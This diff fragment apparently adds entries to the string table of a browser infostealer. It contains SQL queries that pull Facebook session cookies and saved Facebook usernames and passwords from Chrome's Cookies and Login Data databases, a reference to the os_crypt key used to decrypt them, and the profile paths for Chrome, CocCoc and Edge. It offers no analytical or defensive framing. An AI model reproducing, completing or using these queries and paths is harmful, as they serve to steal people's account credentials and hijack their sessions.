@@ -23,3 +23,12 @@ Google|Chrome
 Microsoft|Edge
 SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key
 os_crypt|encrypted_key
+facebook
+select username_value, password_value from logins where origin_url like '%facebook.com%' order by date_last_used
+\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
+\\..\\Local\\Google\\Chrome\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Login Data
+\\..\\Local\\CocCoc\\Browser\\User Data\\Profile 
+\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data
+\\..\\Local\\Microsoft\\Edge\\User Data\\Profile 
+\\Login Data
